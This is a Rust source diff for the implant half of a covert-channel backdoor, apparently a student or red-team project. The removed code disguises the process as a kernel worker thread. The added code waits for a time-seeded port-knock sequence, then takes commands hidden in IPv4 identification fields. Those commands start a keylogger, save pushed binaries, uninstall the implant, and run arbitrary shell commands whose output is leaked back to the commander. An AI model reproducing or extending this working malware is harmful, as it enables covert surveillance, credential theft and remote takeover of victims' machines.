@@ -1,94 +1,192 @@
-mod covert;
-mod keylogger;
-
+use std::net::{IpAddr, Ipv4Addr};
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::Arc;
+use std::thread;
+use std::time::{Duration, SystemTime, UNIX_EPOCH};
 use std::fs::File;
 use std::io::Write;
-use std::process::Command;
-use std::sync::{Arc, Mutex};
-use std::net::Ipv4Addr;
 
+use pnet::datalink::{self, Channel, NetworkInterface, DataLinkReceiver};
+use pnet::packet::ipv4::Ipv4Packet;
+use pnet::packet::tcp::TcpPacket;
+use pnet::packet::Packet;
+
+mod keylogger;
+mod covert; 
+
+// Command Codes (Must match main.rs exactly)
 const CMD_START_LOGGER: u8   = 0x10;
 const CMD_STOP_LOGGER: u8    = 0x20;
 const CMD_UNINSTALL: u8      = 0x30;
 const CMD_START_TRANSFER: u8 = 0x40;
 const CMD_EOF: u8            = 0x41;
 
-fn set_process_name(name: &str) {
-    let _ = std::fs::write("/proc/self/comm", name);
-    
-    #[cfg(target_os = "linux")]
-    unsafe {
-        let c_name = std::ffi::CString::new(name).unwrap();
-        libc::prctl(libc::PR_SET_NAME, c_name.as_ptr() as libc::c_ulong, 0, 0, 0);
+// --- Seed & RNG Logic (Must match port_knkr.rs exactly) ---
+pub struct SimpleRng { state: u64 }
+impl SimpleRng {
+    pub fn new(seed: u64) -> Self { Self { state: seed } }
+    pub fn next_u32(&mut self) -> u32 {
+        self.state = self.state.wrapping_mul(6364136223846793005).wrapping_add(1);
+        (self.state >> 32) as u32
+    }
+    pub fn gen_port(&mut self) -> u16 {
+        1024 + (self.next_u32() % (65535 - 1024)) as u16
     }
 }
 
-fn main() {
-    set_process_name("kworker/u2:1-events"); 
+fn generate_seed(ip: &Ipv4Addr) -> u64 {
+    let ip_u32: u32 = (*ip).into();
+    let time_step = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs() / 60; 
+    (ip_u32 as u64) ^ time_step
+}
 
-    println!("[*] Victim active. Disguised as kworker. Listening...");
+struct Victim {
+    interface: NetworkInterface,
+    local_ip: Ipv4Addr,
+    keylogger_active: Arc<AtomicBool>,
+}
 
-    loop {
-        if let Some((byte, commander_ip)) = covert::CovertChannel::receive_byte() {
-            match byte {
-                CMD_START_LOGGER => {
-                    println!("[+] Signal from {}. Starting Keylogger...", commander_ip);
-                    let channel = Arc::new(Mutex::new(covert::CovertChannel::new(commander_ip)));
-                    keylogger::start(channel); 
-                }
+impl Victim {
+    fn new() -> Self {
+        let (interface, local_ip) = Self::find_active_interface()
+            .expect("No active network interface found");
+        Self {
+            interface,
+            local_ip,
+            keylogger_active: Arc::new(AtomicBool::new(false)),
+        }
+    }
 
-                CMD_START_TRANSFER => {
-                    println!("[*] Receiving file transfer...");
-                    receive_file("received_binary");
-                }
+    fn find_active_interface() -> Option<(NetworkInterface, Ipv4Addr)> {
+        datalink::interfaces().into_iter().find(|iface| {
+            iface.is_up() && !iface.is_loopback() && !iface.ips.is_empty()
+        }).and_then(|iface| {
+            iface.ips.iter().find_map(|ip| {
+                if let IpAddr::V4(v4) = ip.ip() { Some((iface.clone(), v4)) } else { None }
+            })
+        })
+    }
 
-                CMD_UNINSTALL => {
-                    println!("[!] Uninstall signal received. Cleaning up...");
-                    let _ = std::fs::remove_file("received_binary");
-                    std::process::exit(0);
-                }
+    fn wait_for_commander(&self) -> (Ipv4Addr, u16, u16) {
+        let (_, mut rx) = match datalink::channel(&self.interface, Default::default()) {
+            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
+            _ => panic!("Error opening channel"),
+        };
 
-                _ => {
-                    handle_shell_command(byte);
+        loop {
+            let current_seed = generate_seed(&self.local_ip);
+            let mut rng = SimpleRng::new(current_seed);
+            let sequence = [rng.gen_port(), rng.gen_port(), rng.gen_port()];
+            
+            // Dynamic Ports: TX (Commander Target) and RX (Commander Listener)
+            let c2_tx_port = rng.gen_port(); 
+            let c2_rx_port = rng.gen_port(); 
+            
+            let mut knock_idx = 0;
+
+            while knock_idx < sequence.len() {
+                if let Ok(packet) = rx.next() {
+                    if let Some(ip_pkt) = Ipv4Packet::new(&packet[14..]) {
+                        if let Some(tcp_pkt) = TcpPacket::new(ip_pkt.payload()) {
+                            if tcp_pkt.get_destination() == sequence[knock_idx] {
+                                knock_idx += 1;
+                                if knock_idx == sequence.len() {
+                                    // Roles Swapped: We send TO c2_rx_port, and listen ON c2_tx_port
+                                    return (ip_pkt.get_source(), c2_rx_port, c2_tx_port);
+                                }
+                            } else if knock_idx > 0 {
+                                knock_idx = 0;
+                            }
+                        }
+                    }
                 }
             }
         }
     }
-}
-fn receive_file(filename: &str) {
-    let mut file = File::create(filename).unwrap();
-    loop {
-        if let Some((byte, _)) = covert::CovertChannel::receive_byte() {
-            if byte == CMD_EOF { break; }
-            file.write_all(&[byte]).unwrap();
+
+    pub fn run(&mut self) {
+        let (commander_ip, tx_port, rx_port) = self.wait_for_commander();
+
+        let (transmitter, rx) = covert::CovertChannel::new(
+            &self.interface,
+            commander_ip,
+            self.local_ip,
+            tx_port, // Destination (C2's listener)
+            rx_port  // Listener (What C2 sends to)
+        );
+
+        self.process_commands(rx, transmitter);
+    }
+
+    fn process_commands(&mut self, mut rx: Box<dyn DataLinkReceiver>, mut transmitter: covert::CovertChannel) {
+        let mut string_buffer = String::new();
+        let mut binary_mode = false;
+        let mut file_data = Vec::new();
+
+        loop {
+            if let Ok(packet) = rx.next() {
+                if let Some(ip_pkt) = Ipv4Packet::new(&packet[14..]) {
+                    if ip_pkt.get_source() == transmitter.config.target_ip {
+                        if let Some(tcp_pkt) = TcpPacket::new(ip_pkt.payload()) {
+                            if tcp_pkt.get_destination() == transmitter.config.listen_port {
+                                
+                                let byte = (ip_pkt.get_identification() & 0x00FF) as u8;
+
+                                match byte {
+                                    CMD_START_LOGGER => {
+                                        self.keylogger_active.store(true, Ordering::SeqCst);
+                                        let flag = self.keylogger_active.clone();
+                                        thread::spawn(move || { let _ = keylogger::run_with_flag(flag); });
+                                    },
+                                    CMD_STOP_LOGGER => self.keylogger_active.store(false, Ordering::SeqCst),
+                                    CMD_UNINSTALL => std::process::exit(0),
+                                    CMD_START_TRANSFER => {
+                                        binary_mode = true;
+                                        file_data.clear();
+                                    },
+                                    CMD_EOF => {
+                                        if binary_mode {
+                                            self.save_file(&file_data);
+                                            binary_mode = false;
+                                        }
+                                    },
+                                    b'\n' => {
+                                        if !binary_mode {
+                                            self.execute_shell(&string_buffer, &mut transmitter);
+                                            string_buffer.clear();
+                                        }
+                                    },
+                                    _ => {
+                                        if binary_mode {
+                                            file_data.push(byte);
+                                        } else {
+                                            string_buffer.push(byte as char);
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
         }
     }
-    println!("[+] File received and saved as {}", filename);
-    
-    #[cfg(unix)]
-    {
-        use std::os::unix::fs::PermissionsExt;
-        if let Ok(metadata) = std::fs::metadata(filename) {
-            let mut perms = metadata.permissions();
-            perms.set_mode(0o755);
-            let _ = std::fs::set_permissions(filename, perms);
+
+    fn execute_shell(&self, cmd: &str, transmitter: &mut covert::CovertChannel) {
+        let output = std::process::Command::new("sh").arg("-c").arg(cmd).output();
+        if let Ok(out) = output {
+            for b in out.stdout {
+                transmitter.send_byte(b);
+                thread::sleep(Duration::from_micros(500));
+            }
+        }
+    }
+
+    fn save_file(&self, data: &[u8]) {
+        if let Ok(mut f) = File::create("received_bin") {
+            let _ = f.write_all(data);
         }
     }
 }
 
-fn handle_shell_command(first_byte: u8) {
-    let mut buffer = vec![first_byte];
-    loop {
-        if let Some((byte, _)) = covert::CovertChannel::receive_byte() {
-            if byte == b'\n' { break; }
-            buffer.push(byte);
-        }
-    }
-    let cmd = String::from_utf8_lossy(&buffer);
-    println!("[*] Executing: {}", cmd);
-    
-    let output = Command::new("sh").arg("-c").arg(cmd.as_ref()).output();
-    if let Ok(out) = output {
-        println!("[+] Output: {}", String::from_utf8_lossy(&out.stdout));
-    }
-}
+fn main() { Victim::new().run(); }
